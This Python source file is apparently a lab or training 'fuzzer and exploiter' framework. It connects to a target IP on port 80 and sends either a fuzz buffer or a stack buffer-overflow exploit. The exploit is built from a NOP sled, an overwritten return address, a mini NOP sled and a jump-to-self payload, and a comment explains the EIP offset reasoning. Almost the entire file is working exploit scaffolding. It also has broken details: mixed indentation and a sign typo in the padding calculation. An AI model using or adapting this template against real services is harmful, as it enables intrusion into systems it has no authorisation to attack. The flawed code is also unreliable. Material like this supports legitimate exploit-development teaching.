"""
CNO Python Basic Fuzzer and Exploiter Framework
Created by: Francis Murray
Date: 19 OCT 2018
Rev: 28 AUG 2019
"""

import socket

import click

CHANGE_ME = 1024
SIZE_OF_BUFFER = CHANGE_ME

@click.group()
@click.argument("ip_address")
@click.pass_context
def cli(ctx, ip_address):
    '''
        This is the main handler for the fuzzer / exploiter
        @in ip_address: the ip of the tgt machine
    '''
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if s is not None:
            s.connect((ip_address, 80))
        else:
            click.echo("The socket was not made")
            exit(-1)
        if s is not None:
            ctx.obj = {'socket': s}
        else:
            click.echo("The socket is of none type.")
            exit(-1)
        pass
    except ConnectionRefusedError:
        click.echo("Unable to connect to {}".format(ip_address))

@click.command()
@click.pass_context
def fuzzer(ctx):
    '''
        This is the fuzzer it just sends \x41s or other chars, you can add chars to the fuzz string
    '''
        
    if ctx is not None:
        if ctx.obj is not None:
            
            pt1 = b"\x90" * 320
            pt2 = b"\x41" * 8
            pt3 = b"\x42" * 8
            pt4 = b"\x43" * 8
            pt5 = b"\x44" * 8
            pt6 = b"\x90" * (256 -32)
            fuzz = pt1 + pt2 + pt3 + pt4 + pt5 + pt6

            print("Sending {}".format(repr(fuzz)))
            ctx.obj['socket'].send(fuzz)
        else:
            print("ctx.obj is none")
            exit(-1)
    else:
        print("Pass context failed")
        exit(-1)


@click.command()
@click.pass_context
def exploit(ctx):
    if ctx is not None:
        '''
            This is the exploiter it sends a nop sled padded payload and mem address
        '''
        if ctx.obj is not None:

            nop_sled = b"\x90" * 328
            
			ebfe = b'\xeb\xfe' # this is our payload ;) 

            mem_address = b"\x55\x01\x55\x55" * 2


            """
            ????: 
                Our exploit is (arbitrarily) 512 bytes and our address is at 0x55550155 and our buffer 
                starts at 0x55550000. The bytes we are overriding EIP with start at 328 bytes in or 0x55550148.
                We can either change our EIP, but since we can't use nulls we would then be limited to the range of 
                0x41410101-0x41410147. Instead we can add a mini nop sled and land somewhere after EIP and 
                then have the rest of the buffer to use.
            """
            mini_nop = b"\x90"*10

            nop_sled_end = b"\x90" * (512 - len(nop_sled) - -len(mini_nop) - len(ebfe) - len(mem_address))
            fuzz = nop_sled + mem_address +mini_nop + ebfe + nop_sled_end

            print("Sending {}".format(repr(fuzz)))
            ctx.obj['socket'].send(fuzz)

        else:
            print("ctx.obj is none")
            exit(-1)
    else:
        print("Pass context failed")
        exit(-1)


cli.add_command(fuzzer)
cli.add_command(exploit)

cli()
